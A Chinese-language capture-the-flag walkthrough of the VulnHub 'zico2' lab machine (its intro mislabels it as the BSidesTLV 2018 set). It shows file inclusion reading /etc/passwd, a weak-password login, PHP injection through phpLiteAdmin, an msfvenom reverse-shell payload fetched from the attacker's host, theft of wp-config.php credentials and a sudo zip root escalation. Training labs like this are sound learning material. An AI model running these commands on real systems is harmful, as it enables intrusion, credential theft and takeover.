**VulnHub项目介绍**

VulnHub是一个面向所有人开放的安全靶场，里面有好多安全环境，只要下载相关镜像，在相关虚拟机上面运行就可以练习相关靶场了。本次靶场为BSidesTLV 2018 CTF比赛的整套环境，小编这次攻略仅为部分题目的攻略。

**环境准备**

1,下载靶场虚拟机文件，下载地址为：https://www.vulnhub.com/entry/zico2-1,210/

2,将虚拟机文件导入，VirtualBox

3,启动靶场虚拟机，为了方便练习，网卡设置的桥接模式

![](../Images/43231a49c370057e6383d7edb74f9274.png)

**靶机攻略**

1,获取靶机ip地址

输入命令，netdiscover，获取到靶机ip地址，192.168.1.4

![](../Images/d36f5945b28add1c455d5ed5bbd1ed89.png)2,使用nmap探测靶机开启的端口，发现开启了80端口

![](../Images/6bf2b9264b3a73087828672694549777.png)3,开启了80端口，22端口，一般都是从80的web端寻找突破口，所以访问一下

![](../Images/3e30b77f8867064c9978cb6a51bdb80f.png)4,点击网站页面看到的链接，发现线索，可能存在文件包含

![](../Images/91d1f029c22f6a6ce5148167bd9ca6e4.png)5,修改url里page后的参数值，改为index.php，正常访问网站，说明确实存在包含

![](../Images/9f919721c51749452395db2c1c7fc9a6.png)6,所以继续修改参数，改为../../etc/passwd，发现passwd文件被包含返回

![](../Images/094cc1d0f8fc904733c441830f207b70.png)7,使用kali中自带的目录枚举工具dirb尝试寻找敏感文件，发现dbadmin敏感目录

输入命令：dirb http://192.168.1.4/ /usr/share/dirb/wordlists/common.txt

![](../Images/3848f674e927b761fc24f8abcc2bd2df.png)8,访问http://192.168.1.4/dbadmin/，发现一个test\_db.php页面

![](../Images/cd8f394cc1c188f33f26be8d9c5d7cf8.png)9,访问发现为一个需要密码的界面，尝试弱口令admin，登录成功，网站为phpLiteAdmin V1.9.3的CMS搭建的

![](../Images/704500f6fba45610d6cc859f76ad0e59.png)

![](../Images/6fdaa6ec8cfdfac70a6263f3d8274a8e.png)10,使用searchsploit phpliteadmin命令，搜索是否有能够利用的EXP，发现确实存在对应版本的利用脚本

![](../Images/7268466dd2f5df7ccb0f0c835d47fbb6.png)11,查看说明，意思就是可以利用phpLiteAdmin，创建一个数据库，这个数据库名称起名为xx.php，如果后端没有这个数据库，比如hack.php，会自动创建一个数据库名称的文件，然后在里面填充数据，比如<?php phpinfo()?>,然后访问，会发现执行成功

![](../Images/a7bcfd9efcc7737e39a7eccf8a65d37b.png)![](../Images/94ec5d4b07af5442e6fc7538bbdc9413.png)12,利用之前的包含漏洞发现已经成功写入并可以访问phpinfo界面

![](../Images/64269d1efa6cc3e7bbb65c2124d3acf5.png)13,这样的话，可以利用这个漏洞，直接getshell，思路为用kali下msfvenom生成一个后门文件，然后利用之前的漏洞，命令执行，让靶机将后门文件主动下载到本机，然后弹回shell

首先创建后门文件，命令为：msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse\_tcp LHOST=192.168.1.103 LPORT=443 -f elf -o shell，生成一个后门文件，名字为shell

执行命令:cp shell /var/www/html，将后门文件复制到apache的网站根目录

执行命令:chmod 777 /var/www/html/shell，赋予后门文件可读可写可执行权限

执行命令:service apache2 start，启动攻击机的apache服务

![](../Images/8e0aa5f2572d1ace10ee0de3f69fb7ec.png)14,利用之前的命令执行漏洞，让靶机主动下载该文件 PS：因为自己操作时候忘记截图，所以网上找了个创建成功时候的提示页面，只要将截图里的ip地址换成自己的攻击机靶机即可

![](../Images/f01423d267a01203efe20fcd8218dbcb.png)15,启动msf,输入命令，msfconsole

![](../Images/699f0b7696207c9d3db0125e283fbef4.png)16,设置之前生成后门文件所使用的payload模块

输入命令:use exploit/multi/handler

输入命令:set payload linux/x86/meterpreter/reverse\_tcp

输入命令:set lhost 192.168.1.104

输入命令:set lport  443

输入命令：run

![](../Images/a7d6b1915f4438e197bf213dc74c4bdd.png)17,利用之前的文件包含漏洞，将创建的shell.php执行一下，发现已经成功getshell

![](../Images/8b41d977b6d4358c3127bf0aeff8445d.png)

![](../Images/d7d59dc572a83bedeb363575db2469bb.png)18,meterpreter下执行命令不太方便，可以直接输入shell，进入到交互shell下，因为得到的shell没有前边的主机名用户名那些看着不太方便

可以执行python -c 'import pty; pty.spawn("/bin/bash")' 即可获得正常的交互shell

![](../Images/1b70b85a7621ab632521278d4c5dad8d.png)19,进入到/home目录，查看文件，发现所要进行的下一步操作提示

![](../Images/99b853c55fd2f985fa4acfb8b8812cd1.png)20,进入到wordpress目录下，发下wordpress配置文件

![](../Images/5d25bd6c9bb20718aa6120bdaee7db3a.png)21,因为使用cat命令只能查看到一部分文件信息，所以退回到meterpreter界面，利用download命令，将文件下载到本地进行查看

 运行命令：download /home/zico/wordpress/wp-config.php /root

![](../Images/07d518c4cf32f900fea3f2e3fe1fda0a.png)发现账号密码

![](../Images/412255b957d5f3b8f494eefea1b2e237.png)22,常使用得到的账号密码，通过22端口的ssh登录主机，登录成功

![](../Images/7ea47c090539ea5a21914acbbc0161e0.png)23,下一步就是进行提权，获得root权限，来得到最后的flag

执行命令：sudo -l，查看哪些命令具有root权限，发现具有root权限的为两个解压用的命令可执行

![](../Images/7186da44d08a1fa63dc2dcfc53213620.png)24,可以利用zip命令来进行提权

输入命令:touch /tmp/exploit，在/tmp目录下创建一个exploit名字的文件

输入命令:sudo -u root zip /tmp/exploit.zip /tmp/exploit -T --unzip-command="sh -c /bin/bash"，提权成功

![](../Images/c169775892b50c7593100d907e232507.png)25,进入root目录，查看flat.txt
